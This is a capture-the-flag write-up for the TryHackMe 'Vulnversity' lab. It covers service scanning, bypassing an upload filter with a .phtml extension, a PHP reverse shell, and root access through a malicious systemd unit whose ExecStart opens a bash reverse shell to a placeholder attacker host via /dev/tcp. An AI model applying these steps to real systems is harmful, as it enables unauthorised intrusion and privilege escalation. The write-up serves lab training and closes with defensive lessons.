
# Vulnversity — TryHackMe

**By Stager** | FashilHack

---
## What is this machine
Vulnversity is a beginner-friendly Linux box focused on **web exploitation and privilege escalation**. The goal is to gain initial access through a vulnerable web upload feature and escalate privileges to root.

This lab is very realistic for learning how small misconfigurations (like file upload filtering) can lead to full system compromise.

---

## Target

```
IP: 10.10.73.110
OS: Ubuntu Linux
```

---

## Step 1 — Nmap Scan

First step: enumerate open services.

```bash
nmap -sV 10.10.73.110
```

### Results:

|Port|Service|Version|
|---|---|---|
|21|FTP|vsftpd 3.0.3|
|22|SSH|OpenSSH 7.2p2|
|139|SMB|Samba|
|445|SMB|Samba|
|3128|Proxy|Squid|
|3333|HTTP|Apache 2.4.18|

The interesting target here is **port 3333 (web server)**.

---

## Step 2 — Web Enumeration

Browsing to:

```
http://<IP>:3333
```

Shows a basic Apache page.

Next step: directory brute forcing.

```bash
python3 dirsearch.py -u http://<IP>:3333 -e php,html -x 400,401,403
```

### Findings:

- `/internal` ← **important**
    
- `/images`, `/css`, `/js`
    

The `/internal` directory contains a **file upload form**.

---

## Step 3 — File Upload Exploitation

The upload form blocks certain extensions, so we need to bypass it.

### Method: Burp Suite Intruder
We fuzz file extensions:

```
.php
.php5
.php4
.php3
.phtml
```

### How to detect valid extension:
- Check **response length**
- Check **status code**
- Use **Grep Match** → "extension not allowed"
👉 All blocked extensions return the same response  
👉 One extension behaves differently → **`.phtml`**

✔ That means `.phtml` is allowed

---
## Step 4 — Reverse Shell
Rename your PHP reverse shell:
```
php-reverse-shell.phtml
```

Edit it:
```php
IP = your attacker IP
PORT = your listener port
```

Start listener:
```bash
nc -lvnp 4444
```

Upload the file, then trigger it:
```
http://<IP>:3333/internal/uploads/php-reverse-shell.phtml
```

### Result:
```bash
whoami
# www-data
```

Initial access gained 🎯

---
## Step 5 — Stabilize Shell (Optional)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 6 — Privilege Escalation

Check sudo/systemctl permissions:

```bash
sudo -l
```

Found ability to use **systemctl** → exploitable.

---

## Step 7 — Root via systemctl (GTFOBins)

Instead of reading files, we go straight for a **root reverse shell**.
### Create malicious service (attacker machine):

```ini
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/5557 0>&1'

[Install]
WantedBy=multi-user.target
```

Save as:

```
root.service
```

---

### Host the file:

```bash
python3 -m http.server 80
```

---

### Download on target:

```bash
cd /tmp
wget http://<ATTACKER-IP>/root.service
```

---

### Start the exploit:

```bash
systemctl enable /tmp/root.service
systemctl start root
```

---

### Listener:

```bash
nc -lvnp 5557
```

### Result:

```bash
whoami
# root
```

🔥 Root access achieved

---

## Full Attack Chain

```
Nmap → Web server (port 3333)
  ↓
Directory brute force → /internal
  ↓
Upload form → extension bypass (.phtml)
  ↓
Reverse shell → www-data
  ↓
systemctl privilege escalation
  ↓
Malicious service → root shell
```

---

## Key Takeaways

**1. File upload filtering is fragile**  
Blocking `.php` is not enough — `.phtml` bypassed it easily.

**2. Enumeration is everything**  
Without finding `/internal`, there is no entry point.

**3. Always test multiple extensions**  
Developers often blacklist instead of whitelist.

**4. systemctl is dangerous when misconfigured**  
It allows execution of arbitrary services → full root compromise.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._